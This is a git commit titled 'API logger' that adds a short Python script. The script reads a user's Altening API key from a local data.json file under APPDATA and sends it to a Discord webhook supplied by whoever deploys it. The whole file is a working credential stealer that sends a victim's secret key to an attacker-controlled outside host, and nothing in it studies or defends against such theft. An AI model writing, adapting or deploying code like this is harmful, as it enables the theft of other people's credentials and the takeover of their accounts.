564d1c9bbcaa3abd6bacd26212a090e6f35c5203
Vladimir <71991079+Vladimir-0001@users.noreply.github.com>
2021-03-03 20:09:13 -0500

    API logger

---
+++ logger.py
@@ -0,0 +1,23 @@
+import os
+import json
+from discord_webhook import DiscordWebhook
+from importlib.resources import path
+
+
+#enter you webhook url here
+WEBHOOK_URL = ""
+
+
+roaming = os.getenv('APPDATA')
+key = roaming + '\\altening\\data.json'
+if os.path.exists(key):
+    with open(key) as c:
+        json = json.load(c)
+    API = json.get("Api_Key")
+    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```\n{API}```"))
+    response = f.execute()
+else:
+    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```\nAPI not found.```"))
+    response = f.execute()
+
+
